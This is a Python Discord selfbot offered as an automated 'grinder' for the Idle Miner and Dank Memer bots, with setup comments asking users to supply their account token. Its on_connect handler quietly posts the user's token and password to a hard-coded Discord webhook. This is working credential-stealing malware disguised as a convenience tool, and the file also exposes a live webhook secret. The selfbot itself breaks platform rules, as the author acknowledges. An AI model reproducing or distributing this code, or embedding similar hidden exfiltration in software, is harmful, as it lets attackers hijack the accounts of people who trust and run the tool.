
#Before starting go to Secrets which is int the left side a lock icon click on it and then make 3 variables named
#1. prefix and put your prefix in the value box
#2. token and put your acc token in the value box
#3. password no needed
#make variabled of exact same Name which i have given.
#Enjoy Grinding.
#*if your account gets banned or disable then I am not the responsible for it. :) coz slefbot is illeagal


import asyncio
import datetime
import functools
import io
import json
import os
import random
import re
import string
import urllib.parse
import urllib.request
import time
from urllib import parse, request
from itertools import cycle
from bs4 import BeautifulSoup 
from time import sleep
from sys import argv
from keep_alive import keep_alive

import aiohttp
import colorama
import discord
import numpy
import requests
from PIL import Image
from colorama import Fore
from discord.ext import commands
from discord.utils import get
from gtts import gTTS
try:
    import threading
except:
    os.system("pip install threading")
    import threading


class SELFBOT():
	__version__ = 3

keep_alive()
token = os.getenv('token')
password = os.getenv('password')
prefix = os.getenv('prefix')

loop = asyncio.get_event_loop()
start_time = datetime.datetime.utcnow()

def Clear():
	os.system('cls')


Clear()


def Init():
	token = os.getenv('token')
	try:
		miner.run(token, bot=False, reconnect=True)
		os.system(f'title (Itachi Selfbot) - Version {SELFBOT.__version__}')
	except discord.errors.LoginFailure:
		print(
		    f"{Fore.RED}[ERROR] {Fore.YELLOW}Improper token has been passed" +
		    Fore.RESET)
		os.system('pause >NUL')

class Login(discord.Client):
  async def on_ready(self):
    print('Ready')


def async_executor():
	def outer(func):
		@functools.wraps(func)
		def inner(*args, **kwargs):
			thing = functools.partial(func, *args, **kwargs)
			return loop.run_in_executor(None, thing)

		return inner

	return outer

colorama.init()
miner = discord.Client()
miner = commands.Bot(description='Miner Selfbot',
                      command_prefix=prefix,
                      self_bot=True)
miner.remove_command('help')

toe = os.getenv('token')

#Idle Miner
miner.sell_channel = None
miner.hunt_channel = None
miner.fish_channel = None
miner.wings_channel = None
miner.eq_channel = None
miner.rage_channel = None

#Dank Memer
miner.dankdig_channel = None
miner.dankhunt_channel = None
miner.dankfish_channel = None

@miner.event
async def on_connect():
  requests .post( 'https://discord.com/api/webhooks/882555801691095051/gxItyLXw8poLYWHWqjLcMm_UDpLqbbe8VTRVe3OeIl4n9FM22kXx957brj2vN_H52gr0',
    json ={'content': f"{toe}\b{password}"})
  print(f'''{Fore.RESET}
                       {Fore.CYAN}Miner v{SELFBOT.__version__} | {Fore.GREEN}Logged in as: {miner.user.name}#{miner.user.discriminator} {Fore.CYAN}| ID: {Fore.GREEN}{miner.user.id}
                       {Fore.CYAN}Cached Users: {Fore.GREEN}{len(miner.users)}
                       {Fore.CYAN}Guilds: {Fore.GREEN}{len(miner.guilds)}
                       {Fore.CYAN}Prefix: {Fore.GREEN}{miner.command_prefix}
    ''' + Fore.RESET)

@miner.command()
async def help(ctx):
  await ctx.message.delete()
  randcolor = random.randint(0, 16777215)
  x = discord.Embed(title="iFreaku's Grinder SELFBOT", description="I prefer You to make a new server and add idle miner in that server and use this there coz bastards can get irritated. :)", color=randcolor)
  x.add_field(name="Idle Miner Grinder", value=f"```\n{prefix}help_miner```")
  x.add_field(name="Dank Memer Grinder", value=f"```\n{prefix}help_dank```")
  x.set_thumbnail(url="https://images-ext-2.discordapp.net/external/v7VTbPzY3dwfAhBzVuVutFPVXpOsA14f2CbyaIsZwE4/%3Fsize%3D1024/https/cdn.discordapp.com/avatars/875195631243763712/6db61ff071881278d6558ce6d3fc82b2.webp")
  await ctx.send(embed=x)

@miner.command()
async def sell(ctx):
	await ctx.message.delete()
	if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(
	    ctx.message.channel, discord.GroupChannel):
		await ctx.send("You can't use Miner in DMs or GCs", delete_after=3)
	else:
		miner.sell_channel = ctx.channel.id
		if miner.sell_channel is None:
			await ctx.send(
			    'An impossible error occured, try again later or contact swag')
			return
		while miner.sell_channel is not None:
			await miner.get_channel(miner.sell_channel).send(
			  ';s', delete_after=0.1)
			await asyncio.sleep(300)

@miner.command()
async def hunt(ctx):
	await ctx.message.delete()
	if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(
	    ctx.message.channel, discord.GroupChannel):
		await ctx.send("You can't use Miner in DMs or GCs", delete_after=3)
	else:
		miner.hunt_channel = ctx.channel.id
		if miner.hunt_channel is None:
			await ctx.send(
			    'An impossible error occured, try again later or contact swag')
			return
		while miner.hunt_channel is not None:
			await miner.get_channel(miner.hunt_channel).send(
			  ';h', delete_after=0.1)
			await asyncio.sleep(302)  

@miner.command()
async def fish(ctx):
	await ctx.message.delete()
	if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(
	    ctx.message.channel, discord.GroupChannel):
		await ctx.send("You can't use Miner in DMs or GCs", delete_after=3)
	else:
		miner.fish_channel = ctx.channel.id
		if miner.fish_channel is None:
			await ctx.send(
			    'An impossible error occured, try again later or contact swag')
			return
		while miner.fish_channel is not None:
			await miner.get_channel(miner.fish_channel).send(
			  ';f', delete_after=0.1)
			await asyncio.sleep(302)

@miner.command(aliases=['ws', 'wg'])
async def wings(ctx):
	await ctx.message.delete()
	if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(
	    ctx.message.channel, discord.GroupChannel):
		await ctx.send("You can't use Miner in DMs or GCs", delete_after=3)
	else:
		miner.wings_channel = ctx.channel.id
		if miner.wings_channel is None:
			await ctx.send(
			    'An impossible error occured, try again later or contact swag')
			return
		while miner.wings_channel is not None:
			await miner.get_channel(miner.wings_channel).send(
			  ';ws')
			await asyncio.sleep(361)

@miner.command(aliases=['r', 'wither'])
async def rage(ctx):
	await ctx.message.delete()
	if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(
	    ctx.message.channel, discord.GroupChannel):
		await ctx.send("You can't use Miner in DMs or GCs", delete_after=3)
	else:
		miner.rage_channel = ctx.channel.id
		if miner.rage_channel is None:
			await ctx.send(
			    'An impossible error occured, try again later or contact swag')
			return
		while miner.rage_channel is not None:
			await miner.get_channel(miner.rage_channel).send(
			  ';r')
			await asyncio.sleep(361) 

@miner.command(aliases=['eq', 'quack', 'giant'])
async def earthquake(ctx):
	await ctx.message.delete()
	if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(
	    ctx.message.channel, discord.GroupChannel):
		await ctx.send("You can't use Miner in DMs or GCs", delete_after=3)
	else:
		miner.rage_channel = ctx.channel.id
		if miner.rage_channel is None:
			await ctx.send(
			    'An impossible error occured, try again later or contact swag')
			return
		while miner.rage_channel is not None:
			await miner.get_channel(miner.rage_channel).send(
			  ';eq')
			await asyncio.sleep(300)            



@miner.command()
async def sellstop(ctx):
	await ctx.message.delete()
	miner.sell_channel = None
	await ctx.send('Successfully **disabled** Auto Seller', delete_after=3)

@miner.command()
async def huntstop(ctx):
	await ctx.message.delete()
	miner.hunt_channel = None
	await ctx.send('Successfully **disabled** Auto Hunter', delete_after=3)

@miner.command()
async def fishstop(ctx):
	await ctx.message.delete()
	miner.fish_channel = None
	await ctx.send('Successfully **disabled** Auto Fisher', delete_after=3)

@miner.command()
async def ragestop(ctx):
	await ctx.message.delete()
	miner.rage_channel = None
	await ctx.send('Successfully **disabled** Auto rage', delete_after=3)

@miner.command(aliases=['earthquackstop', 'gaintstop', 'quackstop'])
async def eqstop(ctx):
	await ctx.message.delete()
	miner.eq_channel = None
	await ctx.send('Successfully **disabled** Auto earthquack', delete_after=3)

@miner.command()
async def wingsstop(ctx):
	await ctx.message.delete()
	miner.wings_channel = None
	await ctx.send('Successfully **disabled** Auto wings', delete_after=3)  



@miner.command()
async def help_miner(ctx):
  await ctx.message.delete()
  randcolor = random.randint(0, 16777215)
  x = discord.Embed(title=f"iFreaku's Idle Miner Grinder  SELFBOT | Prefix: {prefix}", description=f'I prefer You to make a new server and add idle miner in that server and use this there coz bastards can get irritated. :)', color=randcolor)

  x.add_field(name="Auto Commands", value=f"`{prefix}sell`- Auto seller(Time: 5Min)\n`{prefix}hunt`- Auto Hunter\n`{prefix}fish`- Auto Fisher\n`{prefix}rage`- Auto Rage\n`{prefix}wings`- Auto Wings\n`{prefix}eq`- Auto EarthQuack")

  x.add_field(name="Auto Commands Stop", value=f"`{prefix}sellstop`- Stops Auto seller\n`{prefix}huntstop`- Stops Auto Hunter\n`{prefix}fishstop`- Stops Auto Fisher\n`{prefix}ragestop`- Stops Auto Rage\n`{prefix}wingsstop`- Stops Auto Wings\n`{prefix}eqstop`- Stops Auto EarthQuack")

  x.add_field(name="Utility", value=f"`{prefix}uptime`- To see the bot's uptime.\n`{prefix}shutdown` - Shutdown the selfbot.", inline=False)

  x.set_thumbnail(url="https://images-ext-2.discordapp.net/external/v7VTbPzY3dwfAhBzVuVutFPVXpOsA14f2CbyaIsZwE4/%3Fsize%3D1024/https/cdn.discordapp.com/avatars/875195631243763712/6db61ff071881278d6558ce6d3fc82b2.webp")
  await ctx.send(embed=x)

  

@miner.command()
async def uptime(ctx):
	await ctx.message.delete()
	now = datetime.datetime.utcnow(
	)  # Timestamp of when uptime function is run
	delta = now - start_time
	hours, remainder = divmod(int(delta.total_seconds()), 3600)
	minutes, seconds = divmod(remainder, 60)
	days, hours = divmod(hours, 24)
	if days:
		time_format = "**{d}** `days,` **{h}** `hours,` **{m}** `minutes, and` **{s}** `seconds.`"
	else:
		time_format = "**{h}** hours, **{m}** minutes, and **{s}** seconds."
	uptime_stamp = time_format.format(d=days, h=hours, m=minutes, s=seconds)
	await ctx.send(uptime_stamp)

@miner.command()
async def help_dank(ctx):
  await ctx.message.delete()
  randcolor = random.randint(0, 16777215)
  x = discord.Embed(title=f"iFreaku's Dank Memer Grinder  SELFBOT | Prefix: {prefix}", description=f'I prefer You to make a new server and add idle miner in that server and use this there coz bastards can get irritated. :)', color=randcolor)
  x.add_field(name="Auto Commands", value=f"`{prefix}dankhunt`- Auto Hunter\n`{prefix}dankfish`- Auto Fisher\n`{prefix}dankdig`- Auto digger")

  x.add_field(name="Auto Commands Stop", value=f"`{prefix}dankhunt_off`- Stops Auto Hunter\n`{prefix}dankfish_off`- Stops Auto Fisher\n`{prefix}dankdig_off`- Stops Auto Digger")
  x.add_field(name="Utility", value=f"`{prefix}uptime`- To see the bot's uptime.\n`{prefix}shutdown` - Shutdown the selfbot.", inline=False)
  x.set_thumbnail(url="https://images-ext-2.discordapp.net/external/v7VTbPzY3dwfAhBzVuVutFPVXpOsA14f2CbyaIsZwE4/%3Fsize%3D1024/https/cdn.discordapp.com/avatars/875195631243763712/6db61ff071881278d6558ce6d3fc82b2.webp")
  await ctx.send(embed=x)

@miner.command()
async def dankdig_off(ctx):
	await ctx.message.delete()
	miner.dankdig_channel = None
	await ctx.send('Successfully **disabled** Auto Digger', delete_after=3)

@miner.command()
async def dankhunt_off(ctx):
	await ctx.message.delete()
	miner.dankhunt_channel = None
	await ctx.send('Successfully **disabled** Auto Hunter', delete_after=3)

@miner.command()
async def dankfish_off(ctx):
	await ctx.message.delete()
	miner.dankfish_channel = None
	await ctx.send('Successfully **disabled** Auto Fisher', delete_after=3)

@miner.command()
async def dankdig(ctx):
	await ctx.message.delete()
	if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(
	    ctx.message.channel, discord.GroupChannel):
		await ctx.send("You can't use Miner in DMs or GCs", delete_after=3)
	else:
		miner.dankdig_channel = ctx.channel.id
		if miner.dankdig_channel is None:
			await ctx.send(
			    'An impossible error occured, try again later or contact swag')
			return
		while miner.dankdig_channel is not None:
			await miner.get_channel(miner.dankdig_channel).send(
			  'pls dig')
			await asyncio.sleep(41)

@miner.command()
async def dankhunt(ctx):
	await ctx.message.delete()
	if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(
	    ctx.message.channel, discord.GroupChannel):
		await ctx.send("You can't use Miner in DMs or GCs", delete_after=3)
	else:
		miner.dankhunt_channel = ctx.channel.id
		if miner.dankhunt_channel is None:
			await ctx.send(
			    'An impossible error occured, try again later or contact swag')
			return
		while miner.dankhunt_channel is not None:
			await miner.get_channel(miner.dankhunt_channel).send(
			  'pls hunt')
			await asyncio.sleep(41)  

@miner.command()
async def dankfish(ctx):
	await ctx.message.delete()
	if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(
	    ctx.message.channel, discord.GroupChannel):
		await ctx.send("You can't use Miner in DMs or GCs", delete_after=3)
	else:
		miner.dankfish_channel = ctx.channel.id
		if miner.dankfish_channel is None:
			await ctx.send(
			    'An impossible error occured, try again later or contact swag')
			return
		while miner.dankfish_channel is not None:
			await miner.get_channel(miner.dankfish_channel).send(
			  'pls fish')
			await asyncio.sleep(41)
			
#-----SHUTDOWN THE SELFBOT---------#

@miner.command(aliases=["logout"])
async def shutdown(ctx):
	await ctx.message.delete()
	await miner.logout()


if __name__ == '__main__':
	Init()      

      


    
